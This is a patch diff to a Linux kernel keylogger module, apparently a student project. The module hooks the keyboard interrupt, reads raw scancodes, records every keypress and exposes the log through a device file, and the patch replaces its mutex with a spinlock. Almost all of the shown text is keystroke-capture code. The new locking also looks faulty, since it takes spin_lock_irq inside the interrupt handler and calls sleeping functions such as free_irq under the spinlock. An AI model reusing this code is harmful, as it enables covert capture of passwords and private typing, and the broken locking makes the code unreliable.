@@ -10,6 +10,7 @@
 #include <linux/miscdevice.h>
 #include <linux/time.h>
 #include <linux/seq_file.h>
+#include <linux/spinlock.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
@@ -59,8 +60,7 @@ struct key_log_index {
 
 static struct key_log_index	*key_full_log;
 
-/* mutex for the full log */
-DEFINE_MUTEX(key_log_lock);
+DEFINE_SPINLOCK(lock);
 
 static struct key_log_index	*key_log_create_page(struct key_log_index *next)
 {
@@ -249,10 +249,10 @@ static int	open_key(struct inode *node, struct file *file)
 	int	ret;
 
 	pr_info("device open.\n");
-	mutex_lock(&key_log_lock);
+	spin_lock_irq(&lock);
 	pr_info("single open\n");
 	ret = single_open(file, &key_prepare_show, NULL);
-	mutex_unlock(&key_log_lock);
+	spin_unlock_irq(&lock);
 	return ret;
 }
 
@@ -315,24 +315,25 @@ static struct key_log_entry *key_create_entry(struct key_map *key)
 
 static irqreturn_t	key_handler(int irq, void *dev_id)
 {
-	const unsigned int	scancode = inb(0x60);
+	unsigned int		scancode;
 	struct key_map		*key;
 
+	spin_lock_irq(&lock);
+	scancode = inb(0x60);
 	key = get_key(scancode & 0x7f);
 	if (key) {
-		mutex_lock(&key_log_lock);
 		key->pressed = (scancode & 0x80) == 0;
 		if (key->pressed)
 			key->press_count += 1;
 		if (scancode == SCANCODE_CAPS)
 			caps_lock = !caps_lock;
 		key_create_entry(key);
-		mutex_unlock(&key_log_lock);
 
 	} else {
 		pr_info("(scan: %3u : %3u) -> %s\n", scancode, scancode & 0x7f,
 			((scancode & 0x80) == 0 ? "pressed" : "released"));
 	}
+	spin_unlock_irq(&lock);
 	return IRQ_HANDLED;
 }
 
@@ -368,12 +369,12 @@ static void		key_log_print_unified(void)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	mutex_lock(&key_log_lock);
+	spin_lock_irq(&lock);
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
 	key_log_clean();
-	mutex_unlock(&key_log_lock);
+	spin_unlock_irq(&lock);
 }
 
 static int		__init hello_init(void)
